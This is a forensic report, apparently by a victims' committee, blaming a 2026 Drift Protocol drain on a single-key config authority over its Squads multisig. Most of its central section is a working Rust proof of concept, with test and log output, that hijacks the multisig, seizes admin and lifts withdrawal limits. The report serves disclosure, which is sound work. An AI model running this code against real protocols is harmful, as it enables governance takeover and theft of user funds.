# Drift Protocol Security Theater

**A Technical Forensic Report on Architectural Negligence and the $280M Exploit.**

Following the `Drift Protocol exploit` on April 1, 2026, and the subsequent "spy-thriller" PR campaign by the team, the `Drift Victims Committee` (VCC) has conducted a deep-dive forensic audit of the protocol's `source code` and `on-chain state`.

In this report, we expose the `reality` of Drift's "security" and demonstrate how `millions` in user funds were left perpetually vulnerable, hanging by a `single centralized` thread.


## 1. Anatomy of the Drain: The Withdraw Guard Illusion

Standard Drift architecture includes a safety mechanism for every spot market: the [withdraw_guard_threshold](https://github.com/drift-labs/protocol-v2/blob/master/programs/drift/src/state/spot_market.rs#L86). This parameter acting as a `circuit breaker` against anomalies.

To drain the protocol, the exploiter didn't need to "hack" the math - just needed [administrative access](https://solscan.io/tx/4BKBmAJn6TdsENij7CsVbyMVLJU1tX27nfrMM1zgKv1bs2KJy6Am2NqdA3nJm4g9C6eC64UAf5sNs974ygB9RsN1) on core program state.

Once access was gained, more than 20 transactions of [update_withdraw_guard_threshold](https://github.com/drift-labs/protocol-v2/blob/master/programs/drift/src/instructions/admin.rs#L2943) were executed across drift `spot market accounts`, [raising](2G4hth28eShpHz1ABjG3e2SVytetRnyQo2MEe1Mp2ggoJw59oaN8BrF8UE9HY54ddkpquWffjysMogWQTNgg9hqy) the limits to an astronomical `500,000,000,000,000`.

Combined with artificially inflated collateral, this `open door` allowed the instant removal protocol liquidity.


## 2. The $500M+ TVL & Single Point of Failure

Drift has long marketed its security as being rooted in a decentralized **2-of-5 Squads Multisig**. 

However, they deliberately omitted a critical architectural fact - Drift utilized (and still does) a `Controlled Multisig` configuration.

In this setup, a `Config Authority` is established a privileged entity that:

  * Does not participate in consensus/voting.
  * Can `unilaterally` manipulate the multisig configuration.
  * In Drift’s case, this was a plain, `single-signature Wallet`.

By compromising this one `Config Authority` wallet, the entire `2-of-5 Multisig` becomes a facade.


## 3. The Proof-of-Concept (PoC)

We have developed a `reproduction environment` that simulates the exact state of the Drift and Squads programs on the `day of the exploit`:

> [Github Repository Link](https://github.com/DriftVictimsCommittee/drift-forensic)

In our simulation, we replaced Drift's `Config Authority` with a test key. We demonstrate that an actor with this access can seize full control of the protocol in `less than 10 seconds`.

>   **Technical note:**  
>   We used `dd` binary injection to ensure the account state remains identical to production, except for the authorized public key.  
>   You can `check` this out [here](https://github.com/DriftVictimsCommittee/drift-forensics/tree/main/exploit_test)

### Step 1: Hijacking the Multisig Council

Using the `Config Authority`, we immediately add a `malicious actor` to the current multisig security council:

```rust
    // 1. Add additional multisig member (malicious actor)

    let new_member_pubkey = multisig_malicious_member.pubkey();

    let mut add_member_ix_data = vec![0u8; 8 + 32 + 2 + 1]; // discriminator + pubkey + u16 + Option
    add_member_ix_data[0..8].copy_from_slice(&[1, 219, 215, 108, 184, 229, 214, 8]); // ix discriminator
    add_member_ix_data[8..40].copy_from_slice(new_member_pubkey.as_ref()); // malicious actor pubkey
    add_member_ix_data[40..42].copy_from_slice(&7u16.to_le_bytes()); // max permission (7)
    add_member_ix_data[42] = 0; // memo: None

    let add_member_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(multisig_id, false),
            AccountMeta::new_readonly(multisig_config_authority_compromised.pubkey(), true),
            AccountMeta::new(multisig_config_authority_compromised.pubkey(), true),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
        ],
        data: add_member_ix_data,
    };
```

### Step 2: Neutralizing Consensus

Next, we `lower` the quorum threshold to 1:

```rust
    // 2. Lowering the quorum threshold to 1

    let new_threshold = 1u16;

    let mut set_threshold_ix_data = vec![0u8; 8 + 2 + 1]; // discriminator + u16 + Option
    set_threshold_ix_data[0..8].copy_from_slice(&[141, 42, 15, 126, 169, 92, 62, 181]); // ix discriminator
    set_threshold_ix_data[8..10].copy_from_slice(&new_threshold.to_le_bytes()); // threshold (u16, little-endian)
    set_threshold_ix_data[10] = 0; // memo (None)

    let set_threshold_instrucion = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(multisig_id, false),
            AccountMeta::new_readonly(multisig_config_authority_compromised.pubkey(), true),
            AccountMeta::new(SQUADS_PROGRAM_ID, false),
            AccountMeta::new_readonly(SQUADS_PROGRAM_ID, false),
        ],
        data: set_threshold_ix_data,
    };

```

Then process `both instructions` in the `single` transaction:

```rust
    // ...

    let recent_blockhash = rpc_client.get_latest_blockhash().await.unwrap();

    let tx_1 = Transaction::new_signed_with_payer(
        &[
            set_threshold_instrucion, 
            add_member_instruction
        ],
        Some(&multisig_config_authority_compromised.pubkey()),
        &[multisig_config_authority_compromised],
        recent_blockhash,
    );

    let tx_1_res = rpc_client
        .send_and_confirm_transaction(&tx_1)
        .await
        .unwrap();

    // ...
```
At this point, the "Multisig" effectively dies - one signature now controls `everything`.


### Step 3: Unilateral Governance Execution

With the `quorum threshold at 1`, we execute a batch transaction that `creates`, `approves`, and `executes` a proposal to change the `Admin` of Drift V2 core program state:

Prepare `UpdateAdmin` instruction message for further `governance process`:

```rust
    // ...

    let new_admin: Pubkey = multisig_malicious_member.pubkey();

    let mut update_admin_ix_data = vec![0u8; 8 + 32]; // discriminator + pubkey
    update_admin_ix_data[0..8].copy_from_slice(&[161, 176, 40, 213, 60, 184, 179, 228]); // update_admin ix discriminator
    update_admin_ix_data[8..40].copy_from_slice(new_admin.as_ref()); // new admin pubkey

    let mut message_bytes: Vec<u8> = Vec::new();

    // Header
    message_bytes.push(1); // num_signers
    message_bytes.push(0); // num_writable_signers
    message_bytes.push(2); // num_writable_non_signers

    // Account Keys
    message_bytes.push(3u8); // SmallVec len (3)
    message_bytes.extend_from_slice(&multisig_vault.to_bytes()); // Writable Signer
    message_bytes.extend_from_slice(&drift_state_id.to_bytes()); // Writable Non-Signer
    message_bytes.extend_from_slice(&DRIFT_PROGRAM_ID.to_bytes()); // Readonly Non-Signer

    // Instructions
    message_bytes.push(1u8); // SmallVec len

    message_bytes.push(2); // Program index ([2])

    // Account indexes
    message_bytes.push(2u8);
    message_bytes.extend_from_slice(&[0, 1]);

    // Instruction data
    message_bytes.extend_from_slice(&(update_admin_ix_data.len() as u16).to_le_bytes()); // SmallVec<u16, u8> -> 2 bytes len (LE)
    message_bytes.extend_from_slice(&update_admin_ix_data);

    // ALTs
    message_bytes.push(0);
```

Solely execute the `full governance process`:

```rust
    let mut vault_tx_create_data: Vec<u8> = Vec::new();
    vault_tx_create_data.extend_from_slice(&[48, 250, 78, 168, 208, 226, 218, 211]);
    vault_tx_create_data.push(0); // vault index
    vault_tx_create_data.push(0); // ephemeral
    vault_tx_create_data.extend_from_slice(&(message_bytes.len() as u32).to_le_bytes()); // message lengh
    vault_tx_create_data.extend_from_slice(&message_bytes); // compiled squads message bytes
    vault_tx_create_data.push(0); // memo

    let vault_tx_create_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(multisig_id, false),
            AccountMeta::new(transaction_pda, false),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
        ],
        data: vault_tx_create_data,
    };

    // ..

    let (proposal_pda, _) = Pubkey::find_program_address(
        &[
            b"multisig",
            multisig_id.to_bytes().as_ref(),
            b"transaction",
            tx_index.to_le_bytes().as_ref(),
            b"proposal",
        ],
        &SQUADS_PROGRAM_ID,
    );

    let mut proposal_create_ix_data = vec![0u8; 8 + 8 + 1]; // anchor discriminator + u64 + bool
    proposal_create_ix_data[0..8].copy_from_slice(&[220, 60, 73, 224, 30, 108, 79, 159]); // ix discriminator
    proposal_create_ix_data[8..16].copy_from_slice(&tx_index.to_le_bytes()); // tx_index (u64, little-endian)
    proposal_create_ix_data[16] = 0; // false

    let proposal_create_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(multisig_id, false),
            AccountMeta::new(proposal_pda, false),
            AccountMeta::new(multisig_malicious_member.pubkey(), false),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
        ],
        data: proposal_create_ix_data,
    };

    // Proposal approve

    let mut proposal_approve_ix_data = vec![0u8; 8 + 1]; // anchor discriminator + Option
    proposal_approve_ix_data[0..8].copy_from_slice(&[144, 37, 164, 136, 188, 216, 42, 248]); // ix discriminator
    proposal_approve_ix_data[8] = 0; // None

    let proposal_approve_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(multisig_id, false),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new(proposal_pda, false),
        ],
        data: proposal_approve_ix_data,
    };

    // ------------

    // Vault tx execute

    let vault_tx_execute_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(multisig_id, false),
            AccountMeta::new(proposal_pda, false),
            AccountMeta::new_readonly(transaction_pda, false),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            //
            AccountMeta::new_readonly(multisig_vault, false),
            AccountMeta::new(drift_state_id, false),
            AccountMeta::new(DRIFT_PROGRAM_ID, false),
        ],
        data: vec![194, 8, 161, 87, 153, 164, 25, 171],
    };

    // Process transaction
    // Instructions:
    // 1. Vault transaction Create
    // 2. Create Proposal
    // 3. Approve Proposal
    // 4. Vault Transaction Execute

    let recent_blockhash = rpc_client.get_latest_blockhash().await.unwrap();

    let tx_2 = Transaction::new_signed_with_payer(
        &[
            vault_tx_create_instruction,
            proposal_create_instruction,
            proposal_approve_instruction,
            vault_tx_execute_instruction,
        ],
        Some(&multisig_malicious_member.pubkey()),
        &[&multisig_malicious_member],
        recent_blockhash,
    );

    let tx_2_res = rpc_client
        .send_and_confirm_transaction(&tx_2)
        .await
        .unwrap();
```

The doors to `$500M+` in TVL are now `wide open`...

## 4. Total Administrative Takeover

The transition from a "secure 2-of-5 multisig" to a malicious takeover is completed in a few blocks. Once we are the admin, we execute the final blow - opening the withdrawal floodgates:

```rust
    // Admin access is compromised now
    // so final step - Update Withdrawal Guard Threshold on Drift V2 Program

    let new_withdraw_guard_threshold: u64 = 500_000_000_000_001;

    let mut update_withdraw_guard_threshold_ix_data = vec![0u8; 8 + 8]; // anchor discriminator + u64
    update_withdraw_guard_threshold_ix_data[0..8]
        .copy_from_slice(&[56, 18, 39, 61, 155, 211, 44, 133]); // ix discriminator
    update_withdraw_guard_threshold_ix_data[8..16]
        .copy_from_slice(&new_withdraw_guard_threshold.to_le_bytes()); // threshold

    let update_withdraw_guard_threshold_instrucion = Instruction {
        program_id: DRIFT_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new_readonly(drift_state_id, false),
            AccountMeta::new(usdc_spot_market_id, false),
        ],
        data: update_withdraw_guard_threshold_ix_data,
    };

    // Process the update_withdraw_guard_threshold instruction
    let _update_withdrawal_guard_threshold_result = context.process_and_validate_instruction(
        &update_withdraw_guard_threshold_instrucion,
        &[Check::success()],
    );
```

That's it.

No compromise of council members. No social engineering. No mythical `durable nonce` exploits.

Nothing "sophisticated" - just a straightforward `multisig config authority` takeover.

Everything executed `in less than 5 seconds`:


```bash
$ cargo test --test config_auth_compromise_local_validator -- --nocapture

running 1 test

Transaction 1 (Add member & low threshold): 		5UBszCM2Yxj7YA8BcdHNqrpZCGoRdcFaTkiTnJiqAjW2ZTrMWSSRkMGQMG7yKnF4D8JAjzDdAiMPLTPKvmCjExKx
Transaction 2 (4-in-1 governance action): 			8Z3facaQ5q4AExHaEvhCp4AaD9hZPbFyDDAtsDdTgKqSsqhK8Qsk7GtBvqCPGaFtwyyVT291h2HWcCcWZrtpK4p
Transaction 3 (Update withdraw guard threshold): 	3shGpdCiEbQfsT3uPoHQJtGbJzAXUBYaBfaEoGaAkiJpHepfDybC5LiiuSH64cUfvts3MHQ4f6VLHJpsWRS1SvVo

test test_config_auth_compromise_local_validator ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 2.22s
```

You can also explore the test-env `onchain log`:

```bash
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf invoke [1]
Program log: Instruction: MultisigAddMember
Program 11111111111111111111111111111111 invoke [2]
Program 11111111111111111111111111111111 success
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf consumed 12043 of 1400000 compute units
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf success

Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf invoke [1]
Program log: Instruction: MultisigChangeThreshold
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf consumed 8177 of 1400000 compute units
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf success

Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf invoke [1]
Program log: Instruction: VaultTransactionCreate
Program 11111111111111111111111111111111 invoke [2]
Program 11111111111111111111111111111111 success
Program log: transaction index: 10
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf consumed 24260 of 1400000 compute units
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf success

Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf invoke [1]
Program log: Instruction: ProposalCreate
Program 11111111111111111111111111111111 invoke [2]
Program 11111111111111111111111111111111 success
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf consumed 14498 of 1400000 compute units
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf success

Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf invoke [1]
Program log: Instruction: ProposalApprove
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf consumed 10219 of 1400000 compute units
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf success

Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf invoke [1]
Program log: Instruction: VaultTransactionExecute
Program dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH invoke [2]
Program log: Instruction: UpdateAdmin
Program log: admin: AiLGdNitMjv8n5HMS7HAdV2kaeJZZFd4jdfn5xp1PKrW -> 2Wi4FMQYC98wwnhkaP9XLZUJ86AyhudknndJ8Xynux8w
Program dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH consumed 36705 of 1379372 compute units
Program dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH success
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf consumed 58538 of 1400000 compute units
Program SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf success

Program dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH invoke [1]
Program log: Instruction: UpdateWithdrawGuardThreshold
Program log: updating spot market withdraw guard threshold 34
Program log: spot_market.withdraw_guard_threshold: 500000000000000 -> 500000000000001
Program dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH consumed 5877 of 1400000 compute units
Program dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH success

test test_config_auth_compromise ... ok
```

## 5. Conclusion: Gross Criminal Negligence

This is not a story of "State-Sponsored Cyber Warfare". This is a story of `Gross Negligence`.

> The [Squads Protocol documentation](https://docs.squads.so/main/development/reference/controlled-multisigs) itself explicitly `warns against this setup`:
> 
> "Using a Controlled Multisig is not recommended for most use-cases. Please understand the tradeoffs of having a valid Config Authority before choosing to use this setup."

Drift’s leadership chose to ignore this warning, prioritizing "operational convenience" over the safety of $500 million. 

They sold the public a "Decentralized Multisig" while keeping a centralized master key in a plain wallet.